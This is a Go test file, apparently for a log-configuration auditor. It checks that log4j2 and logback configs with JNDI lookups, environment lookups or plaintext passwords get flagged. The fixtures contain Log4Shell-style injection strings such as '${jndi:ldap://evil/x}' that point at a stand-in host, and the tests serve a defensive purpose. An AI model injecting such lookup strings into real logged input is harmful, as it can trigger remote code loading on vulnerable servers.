package main

import (
	"os"
	"path/filepath"
	"testing"
)

func lgWriteFile(t *testing.T, dir, name, body string) string {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatalf("write %s: %v", name, err)
	}
	return path
}

func lgHasReason(a LogConfigAudit, reason string) bool {
	for _, f := range a.Findings {
		if f.Reason == reason {
			return true
		}
	}
	return false
}

func TestAuditServerLogConfigPlainServer(t *testing.T) {
	audit := AuditServerLogConfig(t.TempDir())
	if audit.Blocking() {
		t.Fatalf("无日志配置不应阻断: %s", audit.Describe())
	}
	if !lgHasReason(audit, lgReasonMissing) {
		t.Fatalf("缺少 missing 提示: %s", audit.Describe())
	}
}

func TestAuditServerLogConfigHealthy(t *testing.T) {
	dir := t.TempDir()
	lgWriteFile(t, dir, "log4j2.xml", "<?xml version=\"1.0\"?><Configuration><Appenders><Console name=\"c\"/></Appenders></Configuration>")
	if err := os.MkdirAll(filepath.Join(dir, "logs"), 0o755); err != nil {
		t.Fatalf("mkdir logs: %v", err)
	}
	lgWriteFile(t, dir, "logs/latest.log", "starting server\n")
	if err := os.Chmod(filepath.Join(dir, "logs/latest.log"), 0o600); err != nil {
		t.Fatalf("chmod: %v", err)
	}
	audit := AuditServerLogConfig(dir)
	if audit.Blocking() || audit.HasWarnings() {
		t.Fatalf("健康日志配置被误报: %s", audit.Describe())
	}
	if len(audit.Files) != 1 {
		t.Fatalf("配置文件计数错误: %v", audit.Files)
	}
}

func TestAuditServerLogConfigJNDI(t *testing.T) {
	dir := t.TempDir()
	lgWriteFile(t, dir, "log4j2.xml", "<Configuration><Appenders><Console name=\"${jndi:ldap://evil/x}\"/></Appenders></Configuration>")
	audit := AuditServerLogConfig(dir)
	if !audit.Blocking() {
		t.Fatalf("JNDI 表达式应阻断: %s", audit.Describe())
	}
	if !lgHasReason(audit, lgReasonJNDILookup) {
		t.Fatalf("缺少 jndi-lookup: %s", audit.Describe())
	}
}

func TestAuditServerLogConfigUppercaseJNDI(t *testing.T) {
	dir := t.TempDir()
	lgWriteFile(t, dir, "log4j2.xml", "<Configuration><Appender> ${JNDI:rmi://host/a} </Appender></Configuration>")
	audit := AuditServerLogConfig(dir)
	if !lgHasReason(audit, lgReasonJNDILookup) {
		t.Fatalf("大小写变体未检出: %s", audit.Describe())
	}
}

func TestAuditServerLogConfigEnvLookup(t *testing.T) {
	dir := t.TempDir()
	lgWriteFile(t, dir, "logback.xml", "<configuration><property name=\"p\" value=\"${env:HOME}\"/></configuration>")
	audit := AuditServerLogConfig(dir)
	if !lgHasReason(audit, lgReasonEnvLookup) {
		t.Fatalf("环境变量查找未检出: %s", audit.Describe())
	}
	if audit.Blocking() {
		t.Fatalf("属性查找只应告警")
	}
}

func TestAuditServerLogConfigPlainSecret(t *testing.T) {
	dir := t.TempDir()
	lgWriteFile(t, dir, "log4j2.xml", "<Configuration><JDBC password=\"hunter2\" url=\"jdbc:mysql://db/x\"/></Configuration>")
	audit := AuditServerLogConfig(dir)
	if !audit.Blocking() {
		t.Fatalf("明文口令应阻断: %s", audit.Describe())
	}
	if !lgHasReason(audit, lgReasonPlainSecret) {
		t.Fatalf("缺少 plaintext-secret: %s", audit.Describe())
	}
}
